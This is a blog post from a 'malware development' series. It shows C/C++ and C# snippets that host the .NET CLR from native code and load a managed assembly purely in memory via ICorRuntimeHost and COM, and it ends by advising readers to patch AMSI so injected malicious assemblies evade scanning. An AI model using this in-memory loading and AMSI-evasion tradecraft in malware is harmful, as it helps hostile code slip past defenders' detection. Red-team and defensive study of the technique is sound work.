# https://0xpat.github.io/Malware_development_part_9/

<!DOCTYPE html><html>

  <body>
    <div class="wrapper-masthead">
      <div class="container">
        
      </div>
    </div>

    <div id="main" role="main" class="container">
      <article class="post">
  <h1>Malware development part 9 - hosting CLR and managed code injection</h1>

  <div class="entry">
    <h2 id="introduction">Introduction</h2>
<p>This is the 9th post of a series which regards the development of malicious software. In this series we will explore and try to implement multiple techniques used by malicious applications to execute code, hide from defenses and persist.<br>
Today we explore techniques for executing managed code from a native code.</p>

<p>Note: We are working with 64-bit code here, as usual.</p>
<h2 id="unmanaged-vs-managed-code">Unmanaged vs managed code</h2>
<p>Unmanaged (native) code is compiled directly to assembly which is interpreted by a processor. Managed code is compiled to some intermediate representation (bytecode) which is interpreted by a runtime. The runtime can also manage memory, collect garbage etc.</p>

<p>Generally it’s easier to develop apps using managed languages like Java or .NET because developer doesn’t need to bother with memory allocation, freeing and other low-level stuff. Runtime provides abstraction from these low-level operations and system API, sometimes even allowing cross-platform development (e.g. .NET Core).</p>

<p>However sometimes developers can benefit from direct integration with operating system’s API and memory offered by native languages (like C/C++). And most importantly (from malware developer’s perspective) - native code is more difficult to reverse engineer and offers more possibilities for obfuscation.</p>

<h2 id="net-runtime-hosting">.NET runtime hosting</h2>
<p>Managed assembly (executable or DLL) when loaded via <code class="language-plaintext highlighter-rouge">CreateProcess</code> or <code class="language-plaintext highlighter-rouge">LoadLibrary</code> is interpreted by Windows loader and the loading routine initializes the CLR (Common Language Runtime). In a PE file there’s a <code class="language-plaintext highlighter-rouge">COM Descriptor Directory</code> which contains .NET metadata and its presence indicates the very fact that the PE contains managed code.</p>

<p>However it is possible to manually host the CLR from a native application using <a href="https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/clr-hosting-interfaces">CLR Hosting interfaces</a>.</p>

<p><code class="language-plaintext highlighter-rouge">mscoree.dll</code> implements functions that we can use for CLR hosting. There is <code class="language-plaintext highlighter-rouge">ICLRRuntimeHost</code> interface which can be used to start the CLR runtime and execute an assembly from disk. The code is as simple as:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ICLRMetaHost</span><span class="o">*</span> <span class="n">metaHost</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="n">CLRCreateInstance</span><span class="p">(</span><span class="n">CLSID_CLRMetaHost</span><span class="p">,</span> <span class="n">IID_ICLRMetaHost</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">metaHost</span><span class="p">);</span>
<span class="n">ICLRRuntimeInfo</span><span class="o">*</span> <span class="n">runtimeInfo</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="n">metaHost</span><span class="o">-&gt;</span><span class="n">GetRuntime</span><span class="p">(</span><span class="s">L"v4.0.30319"</span><span class="p">,</span> <span class="n">IID_ICLRRuntimeInfo</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">runtimeInfo</span><span class="p">);</span>
<span class="n">ICLRRuntimeHost</span><span class="o">*</span> <span class="n">runtimeHost</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="n">runtimeInfo</span><span class="o">-&gt;</span><span class="n">GetInterface</span><span class="p">(</span><span class="n">CLSID_CLRRuntimeHost</span><span class="p">,</span> <span class="n">IID_ICLRRuntimeHost</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">runtimeHost</span><span class="p">);</span>
<span class="n">runtimeHost</span><span class="o">-&gt;</span><span class="n">Start</span><span class="p">();</span>
<span class="n">DWORD</span> <span class="n">retVal</span><span class="p">;</span>
<span class="n">CLRRuntimeHost</span><span class="o">-&gt;</span><span class="n">ExecuteInDefaultAppDomain</span><span class="p">(</span><span class="s">L"path_to_assembly"</span><span class="p">,</span> <span class="s">L"Namespace.Class"</span><span class="p">,</span> <span class="s">L"MethodName"</span><span class="p">,</span> <span class="s">L"argument"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">retVal</span><span class="p">);</span>
</code></pre></div></div>

<p>According to <a href="https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/iclrruntimehost-executeindefaultappdomain-method">documentation</a> the managed method to execute must have the following signature:</p>

<div class="language-c# highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span> <span class="nf">pwzMethodName</span> <span class="p">(</span><span class="n">String</span> <span class="n">pwzArgument</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="executing-net-code-in-memory">Executing .NET code in memory</h2>
<p>However it is not that simple to execute a managed assembly stored for example as a byte array in memory. To do this we must refer to a deprecated <code class="language-plaintext highlighter-rouge">ICorRuntimeHost</code> interface. It allows more control over the managed runtime from the native code.</p>

<p>So instead of <code class="language-plaintext highlighter-rouge">CLRRuntimeHost</code> we want <code class="language-plaintext highlighter-rouge">CorRuntimeHost</code> and that’s what we ask for using <a href="https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/iclrruntimeinfo-getinterface-method"><code class="language-plaintext highlighter-rouge">ICLRRuntimeInfo::GetInterface</code></a>:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ICorRuntimeHost</span><span class="o">*</span> <span class="n">corRuntimeHost</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="n">runtimeInfo</span><span class="o">-&gt;</span><span class="n">GetInterface</span><span class="p">(</span><span class="n">CLSID_CorRuntimeHost</span><span class="p">,</span> <span class="n">IID_ICorRuntimeHost</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">corRuntimeHost</span><span class="p">);</span>
</code></pre></div></div>

<p>To execute a managed assembly in memory we will use managed methods and some reflection:</p>

<div class="language-c# highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Assembly</span> <span class="n">managedAssembly</span> <span class="p">=</span> <span class="n">AppDomain</span><span class="p">.</span><span class="n">CurrentDomain</span><span class="p">.</span><span class="nf">Load</span><span class="p">(</span><span class="n">assemblyByteArray</span><span class="p">);</span>
<span class="n">Type</span> <span class="n">managedType</span> <span class="p">=</span> <span class="n">managedAssembly</span><span class="p">.</span><span class="nf">GetType</span><span class="p">(</span><span class="s">"Namespace.Class"</span><span class="p">);</span>
<span class="kt">object</span><span class="p">[]</span> <span class="n">parameters</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">object</span><span class="p">[</span><span class="m">1</span><span class="p">]</span> <span class="p">{(</span><span class="s">"Argument_1"</span><span class="p">)};</span>
<span class="n">managedType</span><span class="p">.</span><span class="nf">InvokeMember</span><span class="p">(</span><span class="s">"MethodName"</span><span class="p">,</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">Public</span> <span class="p">|</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">InvokeMethod</span> <span class="p">|</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">Static</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="n">parameters</span><span class="p">);</span>
</code></pre></div></div>

<p>But how to execute this managed code from an unmanaged CLR host? We will leverage Component Object Model.</p>

<p>It is possible to <a href="https://docs.microsoft.com/en-us/dotnet/framework/interop/exposing-dotnet-components-to-com">expose .NET components to COM</a>.</p>

<p>.NET framework system assemblies are compiled with COM interoperability enabled, so it’s possible to call public methods from “outside” of the CLR.</p>

<p>To start, we need an unmanaged reference (pointer) to an AppDomain. Application domains are containters that provide isolation boundary within single runtime host. That’s where <code class="language-plaintext highlighter-rouge">CorRuntimeHost</code> interface comes in handy - it allows to retrieve the default AppDomain for current process:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">IUnknown</span><span class="o">*</span> <span class="n">appDomainThunk</span><span class="p">;</span>
<span class="n">pCorRuntimeHost</span><span class="o">-&gt;</span><span class="n">GetDefaultDomain</span><span class="p">(</span><span class="o">&amp;</span><span class="n">appDomainThunk</span><span class="p">);</span>
<span class="n">_AppDomain</span><span class="o">*</span> <span class="n">defaultAppDomain</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="n">appDomainThunk</span><span class="o">-&gt;</span><span class="n">QueryInterface</span><span class="p">(</span><span class="o">&amp;</span><span class="n">defaultAppDomain</span><span class="p">);</span>
</code></pre></div></div>
<p>At this point we can rewrite the .NET code using C++ and COM.</p>

<h3 id="accessing-mscorlib-from-c-using-com">Accessing mscorlib from C++ using COM</h3>
<p>All the code we need is located in <code class="language-plaintext highlighter-rouge">mscorlib.dll</code> which is a managed library of common .NET types and methods.</p>

<p>First of all we need to somehow “translate” the COM interfaces defined in <code class="language-plaintext highlighter-rouge">mscorlib</code> library to a format understood by C++ compiler, like a header defining external function names, signatures and types (so imports, memory offsets, stack alignment for function calls etc.).</p>

<p>There is a <a href="https://docs.microsoft.com/en-us/dotnet/framework/tools/tlbexp-exe-type-library-exporter">Type Library Exporter</a> tool (<code class="language-plaintext highlighter-rouge">tlbexp.exe</code>) which we can use to create a type library from a managed assembly. Type library files should be present after Visual Studio and .NET workload installation but let’s create and analyze them manually:</p>

<p><code class="language-plaintext highlighter-rouge">tlbexp.exe mscorlib.dll</code></p>

<p><code class="language-plaintext highlighter-rouge">.tlb</code> file can be viewed with OLE-COM Object Viewer (<code class="language-plaintext highlighter-rouge">oleview.exe</code>, part of Visual C++ SDK)</p>

<p>Let’s take a look at the .NET code for in-memory assembly loading:</p>

<div class="language-c# highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Assembly</span> <span class="n">managedAssembly</span> <span class="p">=</span> <span class="n">AppDomain</span><span class="p">.</span><span class="n">CurrentDomain</span><span class="p">.</span><span class="nf">Load</span><span class="p">(</span><span class="n">assemblyByteArray</span><span class="p">);</span>
</code></pre></div></div>

<p>In our case, <code class="language-plaintext highlighter-rouge">CurrentDomain</code> is the <code class="language-plaintext highlighter-rouge">_AppDomain* defaultAppDomain</code> pointer. So we need to find a <code class="language-plaintext highlighter-rouge">Load(byte[])</code> function exported as COM interface.</p>

<p><img src="https://0xpat.github.io/images/2021-06-17-Malware_development_part_9/oleview.png" alt="oleview"></p>

<p>We can see that separate COM interface function is declared for every overload of <code class="language-plaintext highlighter-rouge">AppDomain.Load</code> method. We specifically target the overload which uses byte array storing the raw assembly as only parameter. So <code class="language-plaintext highlighter-rouge">Assembly AppDomain.Load(byte[] rawAssembly)</code> becomes <code class="language-plaintext highlighter-rouge">HRESULT _stdcall Load_3([in] SAFEARRAY(unsigned char) rawAssembly, [out, retval] _Assembly** pRetVal);</code>.  Values are returned by reference using the last parameter.</p>

<p>Another thing is that we can’t just provide an unmanaged byte array to this function, we need to create a <a href="https://docs.microsoft.com/en-us/archive/msdn-magazine/2017/march/introducing-the-safearray-data-structure">SAFEARRAY</a>. This is another piece of complicated COM/OLE automation. Note: <code class="language-plaintext highlighter-rouge">VT_UI1</code> used in <code class="language-plaintext highlighter-rouge">SafeArrayCreate</code> is <code class="language-plaintext highlighter-rouge">VARTYPE</code> corresponding to <code class="language-plaintext highlighter-rouge">unsigned char</code>/<code class="language-plaintext highlighter-rouge">byte</code> array.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">SAFEARRAYBOUND</span> <span class="n">bounds</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
<span class="n">bounds</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">cElements</span> <span class="o">=</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">rawAssemblyByteArray</span><span class="p">);</span>
<span class="n">bounds</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">lLbound</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="n">SAFEARRAY</span><span class="o">*</span> <span class="n">safeArray</span> <span class="o">=</span> <span class="n">SafeArrayCreate</span><span class="p">(</span><span class="n">VT_UI1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">bounds</span><span class="p">);</span>
<span class="n">SafeArrayLock</span><span class="p">(</span><span class="n">safeArray</span><span class="p">);</span>
<span class="n">memcpy</span><span class="p">(</span><span class="n">safeArray</span><span class="o">-&gt;</span><span class="n">pvData</span><span class="p">,</span> <span class="n">rawAssemblyByteArray</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">rawAssemblyByteArray</span><span class="p">));</span>
<span class="n">SafeArrayUnlock</span><span class="p">(</span><span class="n">safeArray</span><span class="p">);</span>
<span class="n">_AssemblyPtr</span> <span class="n">managedAssembly</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</code></pre></div></div>

<p>Finally, load the assembly to the AppDomain:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">defaultAppDomain</span><span class="o">-&gt;</span><span class="n">Load_3</span><span class="p">(</span><span class="n">safeArray</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">managedAssembly</span><span class="p">)</span>
</code></pre></div></div>

<p>Next step is to get reference to a type defined in the assembly. This line:</p>

<div class="language-c# highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Type</span> <span class="n">managedType</span> <span class="p">=</span> <span class="n">managedAssembly</span><span class="p">.</span><span class="nf">GetType</span><span class="p">(</span><span class="s">"Namespace.Class"</span><span class="p">);</span>
</code></pre></div></div>

<p>translates to:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">_TypePtr</span> <span class="n">managedType</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="n">_bstr_t</span> <span class="nf">managedClassName</span><span class="p">(</span><span class="s">"ManagedApp.Program"</span><span class="p">);</span>
<span class="n">managedAssembly</span><span class="o">-&gt;</span><span class="n">GetType_2</span><span class="p">(</span><span class="n">managedClassName</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">managedType</span><span class="p">);</span>
</code></pre></div></div>

<p>Now let’s create an array of arguments. So to do this:</p>

<div class="language-c# highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">object</span><span class="p">[]</span> <span class="n">parameters</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">object</span><span class="p">[</span><span class="m">1</span><span class="p">]</span> <span class="p">{(</span><span class="s">"Argument_1"</span><span class="p">)};</span>
</code></pre></div></div>

<p>we need to use <code class="language-plaintext highlighter-rouge">SAFEARRAY</code> again with <code class="language-plaintext highlighter-rouge">VARTYPE</code> corresponding to <a href="https://docs.microsoft.com/en-us/windows/win32/winauto/variant-structure"><code class="language-plaintext highlighter-rouge">VARIANT</code></a> which is another COM/OLE-specific data structure used for example to hold strings:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">SAFEARRAY</span><span class="o">*</span> <span class="n">managedArguments</span> <span class="o">=</span> <span class="n">SafeArrayCreateVector</span><span class="p">(</span><span class="n">VT_VARIANT</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
<span class="n">_variant_t</span> <span class="nf">argument</span><span class="p">(</span><span class="s">L"Argument_1"</span><span class="p">);</span>
<span class="n">LONG</span> <span class="n">index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="n">SafeArrayPutElement</span><span class="p">(</span><span class="n">managedArguments</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">index</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">argument</span><span class="p">);</span>
</code></pre></div></div>

<p>Last thing is to call a function by its name:</p>

<div class="language-c# highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">managedType</span><span class="p">.</span><span class="nf">InvokeMember</span><span class="p">(</span><span class="s">"EntryPoint"</span><span class="p">,</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">Public</span> <span class="p">|</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">InvokeMethod</span> <span class="p">|</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">Static</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="n">parameters</span><span class="p">);</span>
</code></pre></div></div>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">_bstr_t</span> <span class="nf">managedMethodName</span><span class="p">(</span><span class="s">L"EntryPoint"</span><span class="p">);</span>
<span class="n">_variant_t</span> <span class="n">managedReturnValue</span><span class="p">;</span>
<span class="n">_variant_t</span> <span class="n">empty</span><span class="p">;</span>
<span class="n">managedType</span><span class="o">-&gt;</span><span class="n">InvokeMember_3</span><span class="p">(</span>
	<span class="n">managedMethodName</span><span class="p">,</span>
	<span class="n">static_cast</span><span class="o">&lt;</span><span class="n">BindingFlags</span><span class="o">&gt;</span><span class="p">(</span><span class="n">BindingFlags_InvokeMethod</span> <span class="o">|</span> <span class="n">BindingFlags_Static</span> <span class="o">|</span> <span class="n">BindingFlags_Public</span><span class="p">),</span>
	<span class="nb">NULL</span><span class="p">,</span> <span class="n">empty</span><span class="p">,</span> <span class="n">managedArguments</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">managedReturnValue</span><span class="p">);</span>
</code></pre></div></div>

<h2 id="summary">Summary</h2>
<p>The piece of code I described for loading .NET assembly purely in memory has been known for many years but I couldn’t find any good explanation on how it works. Hopefully somebody finds this interesting.</p>

<p>I’ve also spent some time on trying to use <code class="language-plaintext highlighter-rouge">ICLRRuntimeHost</code> instead of deprecated <code class="language-plaintext highlighter-rouge">ICorRuntimeHost</code> but I couldn’t find an easy and elegant way to execute assembly in memory, especially to retrieve a pointer to an <code class="language-plaintext highlighter-rouge">AppDomain</code>. It seems to me that only possible solution would be to load some small assembly which would return a unmanaged pointer to a managed function using <code class="language-plaintext highlighter-rouge">GetFunctionPointerForDelegate</code> and then call it using <a href="https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/iclrruntimehost-executeinappdomain-method"><code class="language-plaintext highlighter-rouge">ICLRRuntimeHost::ExecuteInAppDomain</code> method</a> which isn’t well documented at all. Anyway, <a href="https://stackoverflow.com/questions/40643018/clr-injected-net-code-crashes-on-file-access">here’s an example on stackoverflow.com</a> which I haven’t checked.</p>

<p>One more thing: remember to patch AMSI if you’re injecting some “malicious” assembly because <code class="language-plaintext highlighter-rouge">AppDomain.Load(byte[])</code> (or <code class="language-plaintext highlighter-rouge">_AppDomain::Load_3()</code>) uses AMSI to scan the binary for indicators of malicious intents. See <a href="https://github.com/dotnet/runtime/blob/main/src/coreclr/vm/peimagelayout.cpp#L347">this piece of .NET runtime source code</a> for details.</p>

  </div>

  <div class="date">
    Written on June 17, 2021
  </div>

  
</article>

    </div>

    <div class="wrapper-footer">
      <div class="container">
        
      </div>
    </div>

    

  

</body></html>